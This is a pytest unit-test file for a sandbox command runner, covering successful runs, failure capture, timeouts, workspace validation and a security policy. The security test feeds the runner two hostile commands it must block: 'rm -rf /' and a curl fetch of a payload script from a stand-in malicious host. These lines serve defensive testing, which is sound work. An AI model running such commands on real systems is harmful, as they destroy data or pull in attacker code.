"""Unit tests for SandboxRunner process containment, timeouts, and security policies."""

import sys
from pathlib import Path
import pytest
from app.sandbox.runner import SandboxRunner, SandboxSecurityException


@pytest.fixture
def workspace(tmp_path: Path) -> Path:
    ws = tmp_path / "sandbox_ws"
    ws.mkdir()
    return ws


def test_sandbox_executes_successful_command(workspace: Path):
    runner = SandboxRunner(workspace)
    cmd = f'python -c "print(\'sandbox_test_success\')"'
    result = runner.run(cmd)

    assert result.passed is True
    assert result.exit_code == 0
    assert "sandbox_test_success" in result.stdout
    assert result.timed_out is False


def test_sandbox_captures_failure_and_signature(workspace: Path):
    runner = SandboxRunner(workspace)
    cmd = 'python -c "raise ValueError(\'deliberate_failure_sample\')"'
    result = runner.run(cmd)

    assert result.passed is False
    assert result.exit_code != 0
    assert "ValueError" in result.stderr or "ValueError" in (result.failure_signature or "")


def test_sandbox_enforces_timeout(workspace: Path):
    runner = SandboxRunner(workspace, default_timeout=1.0)
    cmd = 'python -c "import time; time.sleep(5)"'
    result = runner.run(cmd, timeout=1.0)

    assert result.timed_out is True
    assert result.passed is False
    assert "TimeoutExpired" in (result.failure_signature or "")


def test_sandbox_blocks_forbidden_destructive_command(workspace: Path):
    runner = SandboxRunner(workspace)
    with pytest.raises(SandboxSecurityException, match="Prohibited command pattern detected"):
        runner.run("rm -rf /")

    with pytest.raises(SandboxSecurityException, match="Prohibited command pattern detected"):
        runner.run("curl http://malicious.example.com/payload.sh")


def test_sandbox_invalid_workspace():
    with pytest.raises(ValueError, match="Workspace directory does not exist"):
        SandboxRunner("/path/that/definitely/does/not/exist")
